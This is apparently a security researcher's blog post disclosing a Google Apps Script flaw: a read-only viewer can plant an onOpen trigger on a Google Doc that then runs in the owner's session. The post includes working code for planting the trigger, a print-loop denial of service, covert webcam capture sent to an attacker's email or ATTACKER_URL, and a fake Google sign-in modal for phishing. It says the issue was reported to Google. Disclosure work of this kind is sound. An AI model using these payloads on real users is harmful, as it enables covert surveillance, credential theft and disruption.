+++
date = '2026-05-14T11:49:38+05:30'
draft = false
title = 'The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace'
+++

While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power....

Millions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.

A core feature of this platform is the use of "triggers." Think of triggers as automated tripwires; they are rules that tell a script to run automatically in the background whenever a specific event occurs. Users love to automate their workspaces to eliminate repetitive tasks. For example, you might use a trigger to:

Automatically send an email alert the moment a specific document is modified.

Generate and distribute a weekly PDF report every Friday at 5 PM.

Instantly format or validate new data as it is entered. 
## The Core Problem

Google's official documentation states clearly:

> *"They don't run if a file is opened in read-only (view or comment) mode. For standalone scripts, users need at least view access to the script file for triggers to run properly."*

However, during my research, I observed a critical deviation from this rule. While it is true that the trigger won't run when the *Viewer* opens the file, the system fails to prevent the Viewer from *creating* the trigger in the first place. By binding an `onOpen` trigger to a specific Document ID, the read-only user can plant a trap. Because the trigger is tied to the document itself, it fires inside the **owner's or editor's** session the next time they open or refresh the file.

The result: a low-privileged user forcing arbitrary code to execute in a high-privileged user's browser, entirely within the trusted `docs.google.com` domain.

---

## How the Attack Works (Setup)

The attacker—operating with only Viewer access—needs nothing more than the document's ID. From a separate Apps Script project, they run this script once:

```javascript
function myFunction() {
  // Clean up any old triggers
  ScriptApp.getProjectTriggers().forEach(trigger =>
    ScriptApp.deleteTrigger(trigger)
  );

  // Bind a trigger to the target document using only its ID
  ScriptApp.newTrigger('formTriggerRan')
    .forDocument('DOCUMENT_ID_HERE')
    .onOpen()
    .create();
}
```

From this point on, every time the document owner or editor refreshes the file, `formTriggerRan()` executes silently in their session.

---

## Scenario 1 — Basic Proof of Concept

The simplest payload: a modal alert that pops up in the owner's browser.

Steps to Reproduce

1. The Document Owner creates a new Google Document and shares it with the attacker, granting them only Viewer access.

2. The attacker opens the document and copies the Document ID from the URL (the long alphanumeric string between /d/ and /edit).

3. The attacker opens a separate, standalone Google Apps Script project (not the one attached to the document) and pastes the exploit code below, inserting the victim's Document ID.

4. The attacker manually runs myFunction(). Despite only having Viewer access to the target document, the Apps Script engine successfully creates the onOpen trigger without any error.

5. The next time the Owner opens or refreshes the document, the trigger fires silently in their session, and the HTML modal appears natively inside Google Docs.

```javascript

 * STEP 1: Trigger setup — run this ONCE manually as the Viewer (attacker)
 */
function myFunction() {
  // Remove any existing triggers (keeps the environment clean)
  ScriptApp.getProjectTriggers().forEach(trigger =>
    ScriptApp.deleteTrigger(trigger)
  );

  // Bind an onOpen trigger to the victim's document using only its ID
  ScriptApp.newTrigger('formTriggerRan')
    .forDocument('1RGW8gHSimkiFUcw_aerFG5_2rzGVBgdmAGrIxGDOCA0') // ← victim's Document ID
    .onOpen()
    .create();
}

/**
 * STEP 2: The payload — runs automatically when the Owner opens the document
 */
function formTriggerRan(e) {
  const html = HtmlService
    .createHtmlOutput('<script>alert("Executed as Owner");google.script.host.close();</script>')
    .setWidth(200)
    .setHeight(100);

  // Renders natively inside the Google Docs UI — no external links, no redirects
  DocumentApp.getUi().showModalDialog(html, 'Security Alert');
}
```

<video width="100%" controls>
  <source src="/videos/SE1.mp4" type="video/mp4">
</video>

What the owner sees: An unexpected alert popup appearing directly inside their own document.


## Scenario 2 — UI Denial of Service (Infinite Print Loop)

A slightly nastier payload locks up the document entirely. The attacker creates a hidden 1×1 pixel window that forces the browser's print dialog to open  and reopens it every second, even if the owner clicks "Cancel."

```javascript
function formTriggerRan(e) {
  const html = HtmlService.createHtmlOutput(`
    <script>
      function spamPrint() {
        window.print();
        setTimeout(spamPrint, 1000);
      }
      spamPrint();
    </script>
  `).setWidth(1).setHeight(1);

  DocumentApp.getUi().showModalDialog(html, 'Print Preview');
}
```

<video width="100%" controls>
  <source src="/videos/SE2.mp4" type="video/mp4">
</video>

**Impact:** The owner is stuck in an inescapable print loop. The document becomes completely unusable until they know to force close the tab.

---

## Scenario 3 — Covert Camera Exfiltration

This is where it escalates into a serious privacy breach.

The attacker sets up a two-part system:

1. A **Web App** (their own Apps Script project) that receives captured images by email.
2. A **camera trap HTML file** delivered via the trigger as a modal titled "Security Check."

 When the owner refreshes the page, a popup appears natively within Google Docs requesting camera and video permissions. Crucially, the script can only capture photos if the user explicitly enables this camera access. If the owner clicks "Allow" (or if they have previously granted camera permissions to Google Docs, in which case it won't even ask), the exploit proceeds.Once permission is granted, their front camera is covertly activated.
The script then captures photos of the owner every five seconds and sends them to an attacker controlled email address or domain. The attacker can continuously receive and view these images.

**The receiver (attacker's web app):**

```javascript
function doPost(e) {
  const base64Data = e.parameter.image.replace(/^data:image\/[a-z]+;base64,/, '');
  const imageBlob = Utilities.newBlob(
    Utilities.base64Decode(base64Data), 'image/jpeg', 'capture.jpg'
  );

  GmailApp.sendEmail(
    'attacker@email.com',
    `Webcam Capture: ${e.parameter.user}`,
    'Captured image attached.',
    { attachments: [imageBlob] }
  );

  return ContentService.createTextOutput(JSON.stringify({ status: 'OK' }))
    .setMimeType(ContentService.MimeType.JSON);
}
```

**The camera trap (runs in the owner's browser):**

```javascript
const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
video.srcObject = stream;

setInterval(() => {
  canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
  const screenshot = canvas.toDataURL('image/jpeg', 0.7);

  fetch(ATTACKER_URL, {
    method: 'POST',
    body: new URLSearchParams({ image: screenshot, time: new Date().toISOString() })
  });
}, 5000);
```
Unfortunately, I did not record a video Proof of Concept for this specific camera exfiltration attack. However, I do have the actual captured image that the script successfully exfiltrated to my attacker controlled email address.

<img src="/images/Im1.png" width="70%" alt="Proof of Concept Screenshot">
<img src="/images/Im2.png" width="70%" alt="Proof of Concept Screenshot">

**Why this is especially dangerous:** The camera permission prompt appears inside the document the owner already trusts, on Google's own domain. There are no suspicious links, no spoofed websites nothing that would normally raise a red flag.

*A few days after this was reported to Google, the image exfiltration stopped working, suggesting a server-side patch was applied.*

---

## Scenario 4 — Zero-Click Credential Phishing

Standard phishing requires a victim to click a suspicious link and ignore a wrong URL. This attack requires neither.

The trigger renders a **fake Google Sign-In modal** directly inside the real document, on the real `docs.google.com` domain. Now, you might be thinking: *I would spot a fake login screen immediately.* And it is true that a highly vigilant user might notice something feels slightly "off" about the prompt. I am not saying every single person will fall for this trap every time. 

However, context is everything. Because you are safely navigating your own document on a legitimate Google URL, your guard is naturally down. When you are deep in the middle of working and a familiar looking "session expired" box pops up natively on the screen, it is incredibly easy to just type your password on autopilot. The owner, believing they simply need to re-authenticate, enters their credentials—which are silently sent to the attacker's webhook in real time.

**Trigger setup:**

```javascript
function myFunction() {
  ScriptApp.getProjectTriggers().forEach(trigger => ScriptApp.deleteTrigger(trigger));

  ScriptApp.newTrigger('showPhishingModal')
    .forDocument('DOCUMENT_ID_HERE')
    .onOpen()
    .create();
}

function showPhishingModal(e) {
  var html = HtmlService.createHtmlOutputFromFile('login-spoof')
    .setWidth(450)
    .setHeight(650);

  DocumentApp.getUi().showModalDialog(html, 'Sign in to Google Docs');
}
```
<video width="100%" controls>
  <source src="/videos/SE4.mp4" type="video/mp4">
</video>


---

---

### Final Thoughts & Status

Before I sign off, I want to mention that I am very much still a beginner in the web security field. I'm taking things one step at a time, studying different architectures, and learning as I go. 

I stumbled upon this UI behavior during my research and thought it was an interesting edge case worth sharing. I have already reported this to Google, and it is currently undergoing further review by their team. I am still learning how to gauge exact impact levels, so whether this turns out to be a genuine issue or just a weird feature, I hope you found the write up interesting!